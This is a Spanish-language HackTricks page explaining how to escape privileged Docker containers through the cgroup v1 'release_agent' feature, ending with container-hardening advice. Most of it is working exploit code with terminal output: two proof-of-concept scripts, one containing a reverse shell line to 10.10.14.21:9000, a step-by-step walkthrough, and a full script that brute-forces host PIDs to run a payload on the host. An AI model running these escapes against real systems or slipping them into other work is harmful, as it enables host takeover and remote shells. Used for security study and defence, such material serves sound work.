<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Bandera `--privileged`

{% code title="Prueba de concepto inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Segunda Prueba de Concepto" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

La bandera `--privileged` introduce preocupaciones significativas de seguridad, y el exploit se basa en lanzar un contenedor docker con ella habilitada. Al usar esta bandera, los contenedores tienen acceso completo a todos los dispositivos y carecen de restricciones de seccomp, AppArmor y capacidades de Linux.

De hecho, `--privileged` proporciona muchos más permisos de los necesarios para escapar de un contenedor docker mediante este método. En realidad, los "únicos" requisitos son:

1. Debemos estar ejecutándonos como root dentro del contenedor
2. El contenedor debe ser ejecutado con la capacidad de Linux `SYS_ADMIN`
3. El contenedor no debe tener un perfil de AppArmor, o de lo contrario permitir la llamada al sistema `mount`
4. El sistema de archivos virtual cgroup v1 debe estar montado con permisos de lectura-escritura dentro del contenedor

La capacidad `SYS_ADMIN` permite a un contenedor realizar la llamada al sistema mount \(ver [man 7 capabilities](https://linux.die.net/man/7/capabilities)\). [Docker inicia contenedores con un conjunto restringido de capacidades](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) por defecto y no habilita la capacidad `SYS_ADMIN` debido a los riesgos de seguridad que implica hacerlo.

Además, Docker [inicia contenedores con la política de AppArmor `docker-default`](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) por defecto, la cual [previene el uso de la llamada al sistema mount](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) incluso cuando el contenedor se ejecuta con `SYS_ADMIN`.

Un contenedor sería vulnerable a esta técnica si se ejecuta con las banderas: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Desglosando el concepto de prueba

Ahora que entendemos los requisitos para usar esta técnica y hemos refinado el exploit de concepto de prueba, repasémoslo línea por línea para demostrar cómo funciona.

Para activar este exploit necesitamos un cgroup donde podamos crear un archivo `release_agent` y desencadenar la invocación de `release_agent` matando todos los procesos en el cgroup. La forma más fácil de lograrlo es montar un controlador de cgroup y crear un cgroup hijo.

Para hacer eso, creamos un directorio `/tmp/cgrp`, montamos el controlador de cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) y creamos un cgroup hijo \(llamado "x" para los fines de este ejemplo\). Aunque no se ha probado cada controlador de cgroup, esta técnica debería funcionar con la mayoría de los controladores de cgroup.

Si estás siguiendo el proceso y obtienes "mount: /tmp/cgrp: special device cgroup does not exist", es porque tu configuración no tiene el controlador de cgroup RDMA. Cambia `rdma` por `memory` para solucionarlo. Estamos usando RDMA porque el PoC original solo estaba diseñado para funcionar con él.

Nota que los controladores de cgroup son recursos globales que pueden montarse múltiples veces con diferentes permisos y los cambios realizados en un montaje se aplicarán a otro.

Podemos ver la creación del cgroup hijo "x" y el listado de su directorio a continuación.
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
A continuación, habilitamos las notificaciones de cgroup al liberar el cgroup "x" escribiendo un 1 en su archivo `notify_on_release`. También configuramos el agente de liberación de cgroup de RDMA para ejecutar un script `/cmd` — que crearemos más tarde en el contenedor — escribiendo la ruta del script `/cmd` en el host en el archivo `release_agent`. Para hacerlo, obtendremos la ruta del contenedor en el host desde el archivo `/etc/mtab`.

Los archivos que agregamos o modificamos en el contenedor están presentes en el host, y es posible modificarlos desde ambos mundos: la ruta en el contenedor y su ruta en el host.

Las operaciones se pueden ver a continuación:
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Tenga en cuenta la ruta al script `/cmd`, el cual vamos a crear en el host:
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Ahora, creamos el script `/cmd` de tal manera que ejecute el comando `ps aux` y guarde su salida en `/output` en el contenedor especificando la ruta completa del archivo de salida en el host. Al final, también imprimimos el script `/cmd` para ver su contenido:
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Finalmente, podemos ejecutar el ataque generando un proceso que termina inmediatamente dentro del cgroup hijo "x". Al crear un proceso `/bin/sh` y escribir su PID en el archivo `cgroup.procs` en el directorio del cgroup hijo "x", el script en el host se ejecutará después de que `/bin/sh` termine. La salida de `ps aux` realizada en el host se guarda entonces en el archivo `/output` dentro del contenedor:
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# Bandera `--privileged` v2

Los PoCs anteriores funcionan bien cuando el contenedor está configurado con un controlador de almacenamiento que expone la ruta completa del punto de montaje del host, por ejemplo, `overlayfs`, sin embargo, recientemente me encontré con un par de configuraciones que no revelaban de manera obvia el punto de montaje del sistema de archivos del host.

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/) por defecto monta el sistema de archivos raíz de un contenedor sobre `9pfs`. Esto no revela información sobre la ubicación del sistema de archivos del contenedor en la Máquina Virtual de Kata Containers.

\* Más sobre Kata Containers en una futura publicación de blog.

## Device Mapper
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
Vi un contenedor con este montaje raíz en un entorno en vivo, creo que el contenedor se estaba ejecutando con una configuración específica del controlador de almacenamiento `devicemapper`, pero hasta este punto no he podido replicar este comportamiento en un entorno de prueba.

## Una Alternativa de PoC

Obviamente, en estos casos no hay suficiente información para identificar la ruta de los archivos del contenedor en el sistema de archivos del host, por lo que el PoC de Felix no se puede utilizar tal cual. Sin embargo, aún podemos ejecutar este ataque con un poco de ingenio.

La única pieza clave de información requerida es la ruta completa, relativa al host del contenedor, de un archivo para ejecutar dentro del contenedor. Sin poder discernir esto de los puntos de montaje dentro del contenedor, tenemos que buscar en otro lugar.

### Proc al Rescate <a id="proc-to-the-rescue"></a>

El pseudo-sistema de archivos de Linux `/proc` expone las estructuras de datos de procesos del kernel para todos los procesos que se ejecutan en un sistema, incluidos aquellos que se ejecutan en diferentes espacios de nombres, por ejemplo dentro de un contenedor. Esto se puede demostrar ejecutando un comando en un contenedor y accediendo al directorio `/proc` del proceso en el host:Contenedor
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_Es importante mencionar que la estructura de datos `/proc/<pid>/root` es una que me confundió durante mucho tiempo, nunca pude entender por qué tener un enlace simbólico a `/` era útil, hasta que leí la definición real en las páginas del manual:_

> /proc/\[pid\]/root
>
> UNIX y Linux admiten la idea de una raíz del sistema de archivos por proceso, establecida por la llamada al sistema chroot\(2\). Este archivo es un enlace simbólico que apunta al directorio raíz del proceso y se comporta de la misma manera que exe y fd/\*.
>
> Sin embargo, tenga en cuenta que este archivo no es simplemente un enlace simbólico. Proporciona la misma vista del sistema de archivos \(incluyendo espacios de nombres y el conjunto de montajes por proceso\) que el propio proceso.

El enlace simbólico `/proc/<pid>/root` se puede utilizar como una ruta relativa al host para cualquier archivo dentro de un contenedor:Contenedor
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
Este cambio hace que el requisito para el ataque pase de conocer la ruta completa, relativa al host del contenedor, de un archivo dentro del contenedor, a conocer el pid de _cualquier_ proceso que se ejecute en el contenedor.

### Pid Bashing <a id="pid-bashing"></a>

Esta es en realidad la parte fácil, los ids de procesos en Linux son numéricos y se asignan secuencialmente. Al proceso `init` se le asigna el id de proceso `1` y a todos los procesos subsiguientes se les asignan ids incrementales. Para identificar el id de proceso del host de un proceso dentro de un contenedor, se puede utilizar una búsqueda incremental de fuerza bruta:Contenedor
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
Anfitrión
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### Poniéndolo Todo Junto <a id="putting-it-all-together"></a>

Para completar este ataque, se puede utilizar la técnica de fuerza bruta para adivinar el pid para la ruta `/proc/<pid>/root/payload.sh`, con cada iteración escribiendo la ruta del pid adivinado en el archivo `release_agent` de cgroups, activando el `release_agent` y comprobando si se crea un archivo de salida.

La única advertencia con esta técnica es que de ninguna manera es sutil y puede aumentar el conteo de pids considerablemente. Como no se mantienen procesos de larga duración, esto _debería_ no causar problemas de fiabilidad, pero no me cites en eso.

El siguiente PoC implementa estas técnicas para proporcionar un ataque más genérico que el presentado originalmente en el PoC de Felix para escapar de un contenedor privilegiado utilizando la funcionalidad `release_agent` de cgroups:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
La ejecución del PoC dentro de un contenedor privilegiado debería proporcionar una salida similar a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Uso seguro de contenedores

Docker restringe y limita los contenedores por defecto. Aflojar estas restricciones puede crear problemas de seguridad, incluso sin el pleno poder de la bandera `--privileged`. Es importante reconocer el impacto de cada permiso adicional y limitar los permisos en general al mínimo necesario.

Para mantener los contenedores seguros:

* No utilice la bandera `--privileged` ni monte un [socket de Docker dentro del contenedor](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). El socket de Docker permite la creación de contenedores, por lo que es una forma fácil de tomar el control total del host, por ejemplo, ejecutando otro contenedor con la bandera `--privileged`.
* No ejecute como root dentro del contenedor. Utilice un [usuario diferente](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) o [espacios de nombres de usuario](https://docs.docker.com/engine/security/userns-remap/). El root en el contenedor es el mismo que en el host a menos que se remapee con espacios de nombres de usuario. Está solo ligeramente restringido por, principalmente, espacios de nombres de Linux, capacidades y cgroups.
* [Elimine todas las capacidades](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) \(`--cap-drop=all`\) y habilite solo aquellas que sean necesarias \(`--cap-add=...`\). Muchas cargas de trabajo no necesitan ninguna capacidad y agregarlas aumenta el alcance de un ataque potencial.
* [Utilice la opción de seguridad "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) para evitar que los procesos obtengan más privilegios, por ejemplo, a través de binarios suid.
* [Limite los recursos disponibles para el contenedor](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Los límites de recursos pueden proteger la máquina de ataques de denegación de servicio.
* Ajuste los perfiles de [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) \(o SELinux\) para restringir las acciones y llamadas al sistema disponibles para el contenedor al mínimo requerido.
* Utilice [imágenes oficiales de docker](https://docs.docker.com/docker-hub/official_images/) o construya las suyas propias basándose en ellas. No herede ni utilice imágenes [con puertas traseras](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
* Reconstruya regularmente sus imágenes para aplicar parches de seguridad. Esto se da por sentado.

# Referencias

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
